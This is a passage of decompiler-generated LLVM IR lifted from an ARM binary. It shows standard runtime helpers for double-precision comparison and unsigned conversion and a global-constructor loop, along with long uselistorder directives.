  uselistorder i32* @r6, { 13, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 10, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 1, 0, 17, 18, 19, 20, 21, 78, 2, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 3, 11, 91, 92, 4, 93, 94, 95, 96, 97, 98, 5, 99, 100, 101, 102, 103, 6, 104, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 7, 135, 136, 137, 138, 139, 140, 141, 195, 200, 33, 34, 22, 23, 24, 35, 36, 37, 38, 25, 26, 192, 193, 194, 169, 170, 8, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 9, 142, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 14, 15, 16, 153, 154, 155, 156, 167, 168, 196, 197, 198, 199, 27, 28, 29, 30, 31, 32, 39, 40, 41 }
  uselistorder i32* @r5, { 90, 91, 92, 31, 93, 94, 95, 96, 97, 98, 99, 100, 40, 41, 101, 42, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 8, 120, 121, 122, 123, 124, 125, 126, 5, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 27, 43, 9, 3, 44, 143, 147, 144, 145, 146, 23, 152, 148, 149, 150, 151, 153, 154, 155, 10, 156, 157, 158, 11, 159, 160, 161, 162, 163, 164, 165, 166, 167, 12, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 13, 181, 182, 183, 184, 185, 14, 187, 186, 4, 188, 15, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 203, 202, 25, 204, 64, 65, 66, 67, 68, 69, 303, 304, 205, 206, 207, 208, 209, 210, 211, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 212, 0, 213, 214, 215, 216, 217, 218, 317, 318, 319, 320, 1, 321, 322, 323, 70, 71, 72, 73, 74, 75, 45, 46, 47, 48, 49, 50, 51, 85, 16, 7, 86, 52, 53, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 76, 77, 78, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 17, 277, 278, 28, 325, 326, 327, 328, 219, 18, 220, 221, 222, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 223, 19, 224, 225, 226, 227, 228, 229, 230, 29, 231, 232, 20, 233, 234, 235, 236, 237, 238, 26, 239, 240, 241, 242, 30, 246, 21, 247, 248, 249, 250, 251, 252, 253, 254, 6, 255, 256, 257, 258, 259, 260, 38, 39, 243, 2, 244, 245, 22, 261, 262, 263, 55, 54, 24, 329, 330, 79, 80, 81, 82, 83, 84, 324, 56, 57, 58, 59, 60, 61, 62, 63, 32, 33, 34, 35, 36, 37, 87, 88, 89 }
  uselistorder i32 %arg4, { 3, 2, 9, 8, 7, 6, 5, 0, 1, 4, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_1c834, { 1, 0 }
  uselistorder label %dec_label_pc_1c818, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_1c7e4, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1c6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1c6c4, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1c858 = call i32 @function_1c868()
  ret i32 %v0_1c858
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1c860 = call i32 @function_1c868()
  ret i32 %v0_1c860

; uselistorder directives
  uselistorder i32 ()* @function_1c868, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1c864 = load i32, i32* @r0, align 4
  ret i32 %v0_1c864
}

define i32 @function_1c868() local_unnamed_addr {
dec_label_pc_1c868:
  %v0_1c868 = load i32, i32* @ip, align 4
  %v0_1c86c = load i32, i32* @r0, align 4
  %v2_1c86c = mul i32 %v0_1c86c, 2
  %v2_1c86c.off = add i32 %v2_1c86c, 4194303
  %tmp = icmp ult i32 %v2_1c86c.off, 2097152
  %v0_1c874 = load i32, i32* @r2, align 4
  %v2_1c874 = mul i32 %v0_1c874, 2
  br i1 %tmp, label %dec_label_pc_1c8c4, label %bb

bb:                                               ; preds = %dec_label_pc_1c868
  %v2_1c874.off = add i32 %v2_1c874, 4194303
  %tmp26 = icmp ult i32 %v2_1c874.off, 2097152
  br i1 %tmp26, label %dec_label_pc_1c8b8, label %dec_label_pc_1c880

dec_label_pc_1c880:                               ; preds = %dec_label_pc_1c8cc, %dec_label_pc_1c8d8, %bb
  %v0_1c880 = load i32, i32* @r1, align 4
  %v4_1c880 = or i32 %v0_1c880, %v2_1c86c
  %v6_1c880 = icmp eq i32 %v4_1c880, 0
  br i1 %v6_1c880, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_1c880
  %v1_1c884 = load i32, i32* @r3, align 4
  %v5_1c884 = or i32 %v1_1c884, %v2_1c874
  %v7_1c884 = icmp eq i32 %v5_1c884, 0
  br i1 %v7_1c884, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1c880, %bb14
  %v3_1c888 = xor i32 %v0_1c874, %v0_1c86c
  %v5_1c888 = icmp eq i32 %v3_1c888, 0
  br i1 %v5_1c888, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1c88c.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_1c88c = phi i32 [ %v2_1c88c.pre, %.thread..thread1_crit_edge ], [ %v1_1c884, %bb14 ]
  %v5_1c88c = icmp eq i32 %v2_1c88c, %v0_1c880
  br i1 %v5_1c88c, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_1c874, %v0_1c86c
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_1c89c.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1c888, %.thread ]
  %v3_1c89c = icmp slt i32 %v2_1c89c.pre-phi, 0
  br i1 %v3_1c89c, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_1c8a0 = icmp eq i32 %v0_1c86c, %v0_1c874
  br i1 %v10_1c8a0, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_1c8a4 = load i32, i32* @r3, align 4
  %v4_1c8a4 = icmp ult i32 %v0_1c880, %v2_1c8a4
  br i1 %v4_1c8a4, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_1c8a0 = icmp ult i32 %v0_1c86c, %v0_1c874
  br i1 %v4_1c8a0, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_1c874, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_1c8a8 = and i32 %v0_1c874, 1073741824
  %v3_1c8a8 = icmp eq i32 %v2_1c8a8, 0
  %v4_1c8a8 = ashr i32 %v0_1c874, 31
  br i1 %v3_1c8a8, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_1c8ac.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_1c8a8, %bb19 ]
  %v5_1c8ac = sub nsw i32 -1, %v4_1c8ac.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1c8b0 = phi i32 [ %v4_1c8a8, %bb19 ], [ %v5_1c8ac, %.thread7 ]
  %v1_1c8b0 = or i32 %v0_1c8b0, 1
  ret i32 %v1_1c8b0

dec_label_pc_1c8b8:                               ; preds = %bb
  br label %dec_label_pc_1c8cc

dec_label_pc_1c8c4:                               ; preds = %dec_label_pc_1c868
  %v0_1c8c4 = load i32, i32* @r1, align 4
  %v4_1c8c4 = mul i32 %v0_1c86c, 4096
  %v5_1c8c4 = or i32 %v0_1c8c4, %v4_1c8c4
  %v7_1c8c4 = icmp eq i32 %v5_1c8c4, 0
  br i1 %v7_1c8c4, label %dec_label_pc_1c8c4.dec_label_pc_1c8cc_crit_edge, label %dec_label_pc_1c8e0

dec_label_pc_1c8c4.dec_label_pc_1c8cc_crit_edge:  ; preds = %dec_label_pc_1c8c4
  %v2_1c874.off25 = add i32 %v2_1c874, 4194303
  %tmp27 = icmp ult i32 %v2_1c874.off25, 2097152
  br label %dec_label_pc_1c8cc

dec_label_pc_1c8cc:                               ; preds = %dec_label_pc_1c8c4.dec_label_pc_1c8cc_crit_edge, %dec_label_pc_1c8b8
  %v3_1c8d0.pre-phi = phi i1 [ %tmp27, %dec_label_pc_1c8c4.dec_label_pc_1c8cc_crit_edge ], [ true, %dec_label_pc_1c8b8 ]
  br i1 %v3_1c8d0.pre-phi, label %dec_label_pc_1c8d8, label %dec_label_pc_1c880

dec_label_pc_1c8d8:                               ; preds = %dec_label_pc_1c8cc
  %v0_1c8d8 = load i32, i32* @r3, align 4
  %v4_1c8d8 = mul i32 %v0_1c874, 4096
  %v5_1c8d8 = or i32 %v0_1c8d8, %v4_1c8d8
  %v7_1c8d8 = icmp eq i32 %v5_1c8d8, 0
  br i1 %v7_1c8d8, label %dec_label_pc_1c880, label %dec_label_pc_1c8e0

dec_label_pc_1c8e0:                               ; preds = %dec_label_pc_1c8c4, %dec_label_pc_1c8d8
  ret i32 %v0_1c868

; uselistorder directives
  uselistorder i32 %v4_1c8a8, { 1, 0 }
  uselistorder i32 %v1_1c884, { 1, 0 }
  uselistorder i32 %v0_1c880, { 2, 0, 1 }
  uselistorder i32 %v2_1c874, { 0, 2, 1 }
  uselistorder i32 %v0_1c874, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_1c86c, { 1, 0 }
  uselistorder i32 %v0_1c86c, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 18, 7, 5, 12, 14, 19, 6, 20, 15, 4, 21, 2, 1, 0, 8, 10, 9, 11, 3, 22, 23, 16, 13, 17 }
  uselistorder i32* @r3, { 10, 11, 1, 12, 13, 14, 0, 15, 3, 16, 17, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 5, 6, 30, 33, 31, 32, 4, 29, 8, 9, 7, 34 }
  uselistorder i32* @r1, { 73, 74, 11, 75, 76, 77, 78, 79, 80, 12, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 27, 13, 28, 92, 29, 0, 4, 93, 10, 94, 95, 96, 97, 9, 98, 99, 100, 101, 102, 103, 104, 2, 105, 106, 107, 108, 109, 112, 110, 111, 14, 15, 30, 113, 114, 115, 116, 117, 118, 119, 120, 5, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 6, 53, 54, 16, 135, 136, 137, 138, 139, 140, 141, 142, 143, 155, 18, 23, 24, 178, 3, 179, 66, 67, 167, 32, 33, 181, 168, 173, 174, 177, 175, 176, 169, 170, 171, 172, 180, 68, 19, 156, 162, 26, 165, 163, 164, 182, 183, 184, 20, 144, 145, 146, 21, 147, 157, 158, 159, 160, 161, 7, 8, 17, 148, 149, 150, 1, 151, 152, 153, 22, 154, 121, 69, 70, 25, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 71, 72, 166 }
  uselistorder i32* @ip, { 21, 22, 23, 6, 24, 25, 26, 27, 28, 29, 30, 15, 16, 3, 31, 38, 17, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 100, 92, 7, 8, 0, 9, 10, 11, 12, 13, 41, 42, 5, 43, 4, 44, 94, 33, 34, 2, 35, 36, 32, 37, 98, 95, 96, 97, 1, 99, 19, 18, 93, 14, 20, 39, 40, 47, 46, 45, 48, 49 }
  uselistorder label %dec_label_pc_1c8e0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1c880, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1c8e8 = load i32, i32* @r0, align 4
  %v0_1c8ec = load i32, i32* @r2, align 4
  store i32 %v0_1c8ec, i32* @r0, align 4
  store i32 %v0_1c8e8, i32* @r2, align 4
  %v0_1c900 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1c900
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1c904 = load i32, i32* @r0, align 4
  %v1_1c908 = sext i32 %v3_1c904 to i64
  %v2_1c908 = bitcast i64 %v1_1c908 to double
  %v3_1c908 = load i32, i32* @r2, align 4
  %v4_1c908 = sext i32 %v3_1c908 to i64
  %v5_1c908 = bitcast i64 %v4_1c908 to double
  %v7_1c908 = fcmp oeq double %v2_1c908, %v5_1c908
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1c908 = fcmp ule double %v2_1c908, %v5_1c908
  %not.v7_1c908 = xor i1 %v7_1c908, true
  %v1_1c90c = and i1 %not.v6_1c908, %not.v7_1c908
  store i1 %v7_1c908, i1* @cpsr_z, align 1
  br i1 %v1_1c90c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1c908, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1c904

; uselistorder directives
  uselistorder i1 %v7_1c908, { 1, 2, 0 }
  uselistorder i32* @r2, { 16, 28, 29, 82, 83, 84, 9, 85, 86, 87, 88, 89, 90, 11, 91, 92, 10, 93, 94, 95, 96, 12, 30, 31, 32, 97, 98, 99, 100, 101, 103, 104, 105, 106, 108, 109, 110, 111, 53, 13, 6, 156, 157, 158, 159, 112, 113, 2, 114, 117, 118, 115, 116, 7, 132, 119, 17, 18, 160, 3, 161, 168, 169, 173, 162, 163, 142, 42, 43, 164, 144, 148, 149, 152, 150, 151, 145, 146, 147, 141, 14, 133, 170, 54, 120, 121, 122, 107, 1, 171, 5, 172, 123, 124, 125, 126, 8, 127, 128, 4, 129, 0, 130, 131, 102, 70, 71, 66, 19, 20, 33, 165, 166, 167, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 21, 22, 23, 24, 25, 26, 27, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 134, 135, 136, 137, 15, 138, 139, 140, 143, 153, 154, 155 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_1c918 = load i32, i32* @lr, align 4
  %v0_1c91c = call i32 @__aeabi_cdcmple()
  %v0_1c920 = load i1, i1* @cpsr_z, align 1
  %.v0_1c91c. = zext i1 %v0_1c920 to i32
  call void @__pseudo_branch(i32 %v0_1c918)
  ret i32 %.v0_1c91c.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1c92c = load i32, i32* @lr, align 4
  %v0_1c930 = call i32 @__aeabi_cdcmple()
  %v0_1c934 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1c934 to i32
  %.v0_1c930. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1c92c)
  ret i32 %.v0_1c930.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1c940 = load i32, i32* @lr, align 4
  store i32 %v0_1c940, i32* %stack_var_-8, align 4
  %v0_1c944 = call i32 @__aeabi_cdcmple()
  %v0_1c948 = load i1, i1* @cpsr_z, align 1
  %v1_1c948 = load i1, i1* @cpsr_c, align 1
  %v2_1c948 = xor i1 %v1_1c948, true
  %v3_1c948 = or i1 %v0_1c948, %v2_1c948
  %.v0_1c944 = select i1 %v3_1c948, i32 1, i32 %v0_1c944
  %v2_1c94c = xor i1 %v0_1c948, true
  %v3_1c94c = and i1 %v1_1c948, %v2_1c94c
  %..v0_1c944 = select i1 %v3_1c94c, i32 0, i32 %.v0_1c944
  %v2_1c950 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1c950)
  ret i32 %..v0_1c944

; uselistorder directives
  uselistorder i1 %v1_1c948, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1c954 = load i32, i32* @lr, align 4
  store i32 %v0_1c954, i32* %stack_var_-8, align 4
  %v0_1c958 = call i32 @__aeabi_cdrcmple()
  %v0_1c95c = load i1, i1* @cpsr_z, align 1
  %v1_1c95c = load i1, i1* @cpsr_c, align 1
  %v2_1c95c = xor i1 %v1_1c95c, true
  %v3_1c95c = or i1 %v0_1c95c, %v2_1c95c
  %.v0_1c958 = select i1 %v3_1c95c, i32 1, i32 %v0_1c958
  %v2_1c960 = xor i1 %v0_1c95c, true
  %v3_1c960 = and i1 %v1_1c95c, %v2_1c960
  %..v0_1c958 = select i1 %v3_1c960, i32 0, i32 %.v0_1c958
  %v2_1c964 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1c964)
  ret i32 %..v0_1c958

; uselistorder directives
  uselistorder i1 %v1_1c95c, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 68, 1, 6, 7, 8, 9, 58, 59, 64, 60, 61, 62, 65, 10, 11, 12, 55, 13, 63, 14, 15, 16, 17, 54, 69, 18, 20, 19, 70, 66, 23, 24, 25, 26, 21, 22, 67, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 39, 40, 43, 44, 45, 56, 46, 47, 48, 49, 57, 50, 51, 52, 53 }
  uselistorder i1* @cpsr_z, { 9, 10, 11, 12, 13, 20, 21, 22, 23, 24, 25, 14, 15, 16, 17, 2, 3, 18, 19, 27, 28, 29, 30, 31, 32, 33, 0, 34, 1, 4, 5, 26, 6, 7, 8, 35 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1c968 = load i32, i32* @lr, align 4
  %v0_1c96c = call i32 @__aeabi_cdrcmple()
  %v0_1c970 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1c970 to i32
  %.v0_1c96c. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1c968)
  ret i32 %.v0_1c96c.

; uselistorder directives
  uselistorder i1 false, { 44, 13, 14, 85, 86, 87, 88, 89, 90, 91, 92, 93, 0, 10, 45, 36, 46, 47, 48, 49, 50, 4, 94, 6, 51, 16, 52, 53, 54, 15, 55, 56, 58, 59, 60, 61, 62, 63, 64, 57, 17, 65, 28, 18, 29, 66, 67, 68, 20, 19, 11, 12, 69, 70, 71, 2, 3, 72, 30, 31, 73, 32, 33, 21, 39, 40, 7, 22, 74, 34, 35, 75, 76, 37, 38, 77, 78, 41, 42, 79, 80, 81, 82, 83, 84, 43, 95, 1, 25, 24, 26, 23, 8, 9, 27, 5, 96, 97, 98, 99 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 13, 14, 15, 16, 17, 8, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 3, 42, 43, 44, 45, 46, 20, 21, 22, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 94, 64, 63, 0, 65, 66, 1, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 4, 113, 114, 115, 5, 116, 117, 118, 6, 119, 120, 121, 122, 123, 124, 125, 126, 68, 70, 71, 7, 73, 74, 72, 95, 96, 97, 127, 27, 128, 129, 130, 98, 99, 100, 131, 91, 92, 75, 76, 88, 89, 90, 93, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 2, 87, 69, 18, 19, 67, 101, 102, 23, 24, 25, 9, 10, 11, 12, 26 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1c97c = icmp slt i32 %arg1, 0
  %v2_1c97c = mul i32 %arg1, 2
  br i1 %v1_1c97c, label %dec_label_pc_1c9b0, label %dec_label_pc_1c984

dec_label_pc_1c984:                               ; preds = %entry
  %v1_1c984 = add i32 %v2_1c97c, 2097152
  %v2_1c984 = icmp ugt i32 %v2_1c97c, -2097153
  br i1 %v2_1c984, label %dec_label_pc_1c9b8, label %dec_label_pc_1c98c

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c984
  %v6_1c984 = icmp slt i32 %v1_1c984, 0
  br i1 %v6_1c984, label %dec_label_pc_1c990, label %dec_label_pc_1c9b0

dec_label_pc_1c990:                               ; preds = %dec_label_pc_1c98c
  %v4_1c994 = sdiv i32 %v1_1c984, 2097152
  %v5_1c994 = sub nsw i32 -993, %v4_1c994
  %v11_1c994 = icmp slt i32 %v5_1c994, 0
  br i1 %v11_1c994, label %dec_label_pc_1c9c0, label %dec_label_pc_1c99c

dec_label_pc_1c99c:                               ; preds = %dec_label_pc_1c990
  %v3_1c99c = mul i32 %arg1, 2048
  %v4_1c9a4 = udiv i32 %arg2, 2097152
  %v1_1c9a0 = or i32 %v3_1c99c, %v4_1c9a4
  %v5_1c9a4 = or i32 %v1_1c9a0, -2147483648
  %v6_1c9a8 = lshr i32 %v5_1c9a4, %v5_1c994
  ret i32 %v6_1c9a8

dec_label_pc_1c9b0:                               ; preds = %dec_label_pc_1c98c, %entry
  ret i32 0

dec_label_pc_1c9b8:                               ; preds = %dec_label_pc_1c984
  %v4_1c9b8 = mul i32 %arg1, 4096
  %v5_1c9b8 = or i32 %v4_1c9b8, %arg2
  %v7_1c9b8 = icmp eq i32 %v5_1c9b8, 0
  br i1 %v7_1c9b8, label %dec_label_pc_1c9c0, label %dec_label_pc_1c9c8

dec_label_pc_1c9c0:                               ; preds = %dec_label_pc_1c9b8, %dec_label_pc_1c990
  ret i32 -1

dec_label_pc_1c9c8:                               ; preds = %dec_label_pc_1c9b8
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 22, 25, 14, 26, 12, 13, 15, 16, 23, 24, 17, 27, 18, 28, 11, 19 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 10, 11, 9, 12, 17, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 195, 36, 37, 38, 166, 39, 40, 41, 42, 43, 84, 44, 45, 196, 46, 197, 107, 108, 199, 157, 158, 198, 109, 200, 201, 202, 203, 204, 83, 124, 173, 47, 175, 174, 205, 206, 207, 48, 85, 86, 87, 88, 89, 90, 208, 209, 210, 211, 212, 159, 160, 161, 49, 162, 91, 232, 233, 113, 234, 235, 94, 236, 93, 237, 92, 213, 82, 214, 215, 50, 51, 216, 217, 125, 126, 181, 127, 182, 128, 183, 52, 95, 53, 163, 129, 184, 130, 185, 131, 186, 132, 187, 133, 188, 110, 176, 81, 54, 238, 111, 224, 55, 134, 225, 226, 56, 135, 227, 228, 121, 167, 0, 57, 136, 96, 98, 97, 99, 100, 101, 102, 115, 103, 116, 104, 105, 218, 219, 122, 58, 59, 60, 164, 61, 123, 220, 117, 114, 62, 221, 222, 223, 63, 165, 1, 64, 65, 66, 67, 68, 69, 70, 71, 72, 168, 73, 74, 75, 76, 77, 137, 112, 138, 177, 178, 139, 78, 140, 79, 118, 179, 180, 141, 142, 119, 143, 144, 145, 148, 169, 147, 170, 171, 146, 172, 156, 149, 189, 150, 190, 191, 192, 193, 151, 194, 152, 153, 154, 231, 120, 229, 80, 230, 106, 155 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c9d4 = load i32, i32* @global_var_2b074.1506, align 4
  %v7_1c9d8 = icmp eq i32 %v3_1c9d4, -1
  %v3_1c9dc = load i32, i32* @r4, align 4
  store i32 %v3_1c9dc, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2b074.1506 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1c9d8, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1c9dc, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1c9ec = phi i32 [ %v3_1c9f0, %.preheader ], [ %v3_1c9d4, %entry ]
  call void @__pseudo_branch(i32 %v0_1c9ec)
  %v0_1c9f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c9f0 = add i32 %v0_1c9f0, -4
  %v2_1c9f0 = inttoptr i32 %v1_1c9f0 to i32*
  %v3_1c9f0 = load i32, i32* %v2_1c9f0, align 4
  store i32 %v1_1c9f0, i32* %r4.global-to-local, align 4
  %v3_1c9f4 = icmp eq i32 %v3_1c9f0, -1
  br i1 %v3_1c9f4, label %dec_label_pc_1c9fc, label %.preheader

dec_label_pc_1c9fc:                               ; preds = %.preheader
  %v2_1c9fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c9fc, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_1c9f0, { 1, 0 }
  uselistorder i32 %v3_1c9d4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 63, 20, 21, 22, 55, 23, 31, 64, 65, 66, 15, 32, 33, 34, 67, 68, 69, 16, 35, 36, 37, 70, 71, 72, 17, 38, 39, 73, 30, 29, 74, 75, 76, 28, 27, 26, 25, 40, 41, 42, 43, 44, 12, 45, 13, 46, 14, 77, 24, 47, 56, 0, 52, 53, 54, 60, 61, 62, 48, 19, 18, 57, 58, 59, 49, 50, 1, 51, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2 }
  uselistorder i32 -1, { 206, 0, 1, 52, 318, 207, 55, 56, 53, 54, 208, 57, 58, 59, 60, 61, 2, 209, 210, 211, 212, 3, 213, 214, 4, 5, 215, 6, 7, 76, 77, 8, 319, 216, 320, 321, 217, 322, 99, 323, 177, 9, 324, 100, 10, 11, 101, 295, 12, 13, 14, 107, 105, 102, 296, 158, 159, 106, 104, 103, 181, 297, 325, 218, 219, 96, 62, 220, 15, 83, 89, 90, 326, 221, 16, 63, 108, 327, 222, 223, 328, 329, 330, 109, 331, 110, 332, 111, 224, 84, 112, 18, 19, 183, 78, 79, 182, 333, 86, 85, 80, 81, 225, 161, 162, 226, 227, 17, 336, 337, 228, 97, 64, 229, 338, 20, 65, 230, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 231, 233, 66, 91, 339, 234, 340, 341, 98, 92, 93, 342, 343, 344, 345, 346, 167, 113, 347, 232, 184, 94, 235, 204, 348, 205, 349, 350, 236, 185, 186, 21, 351, 237, 238, 352, 353, 187, 114, 367, 115, 373, 116, 307, 117, 393, 118, 394, 119, 395, 120, 368, 121, 396, 22, 23, 239, 24, 122, 308, 309, 240, 241, 242, 305, 188, 189, 123, 25, 310, 26, 298, 88, 243, 27, 299, 244, 190, 245, 28, 29, 87, 67, 68, 246, 247, 248, 82, 311, 249, 312, 30, 31, 124, 335, 125, 306, 126, 313, 127, 374, 128, 364, 129, 317, 130, 304, 131, 334, 191, 362, 132, 363, 250, 